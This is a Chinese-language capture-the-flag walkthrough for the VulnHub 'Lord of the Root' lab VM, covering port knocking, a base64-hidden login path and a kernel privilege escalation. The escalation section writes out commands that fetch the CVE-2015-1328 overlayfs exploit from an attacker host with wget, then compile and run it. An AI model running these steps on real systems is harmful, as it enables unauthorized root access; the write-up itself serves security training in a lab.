项目地址：https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

## CTF

### Port Knocking

SSH 连接回显，提示 1，2，3

使用 NMap 进行端口敲击

```
-Pn 作用：跳过主机发现阶段，直接假设目标主机在线
```

然后发现开启了 1337 端口

![](https://pic1.imgdb.cn/item/69b298c98bff4b5d2a2016ee.png)

打开 1337 端口后，我们通过网页浏览器访问它

![](https://pic1.imgdb.cn/item/69b299018bff4b5d2a2016ef.png)

`/index.php` 可以获取到一张新图片，查看源代码后，在注释中发现了一个 base64 哈希值

![](https://pic1.imgdb.cn/item/69b299308bff4b5d2a2016f1.png)

多次解码后得到 `/978345210/index.php`，访问是一个登录页面

![](https://pic1.imgdb.cn/item/69b2998a8bff4b5d2a2016f9.png)

## 提权

### 内核 overlayfs 文件系统（CVE-2015-1328）

查看系统版本

![](https://pic1.imgdb.cn/item/69b29b618bff4b5d2a201707.png)

```bash
cd /tmp
wget http://192.168.1.9:4444/39166.c
gcc -o overlayfs 39166.c
./overlayfs
```
